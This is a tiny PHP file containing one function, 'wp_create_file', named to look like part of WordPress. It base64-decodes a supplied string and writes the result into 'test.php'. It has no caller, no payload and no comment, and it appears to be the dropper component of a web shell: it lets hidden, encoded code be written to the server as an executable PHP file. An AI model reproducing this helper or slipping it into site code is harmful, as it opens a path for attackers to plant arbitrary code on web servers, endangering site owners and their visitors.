<?php
function wp_create_file($str) {
    $body = base64_decode($str); 
	$fw = fopen("test.php","w"); 
	fwrite($fw,$body); 

}
?>
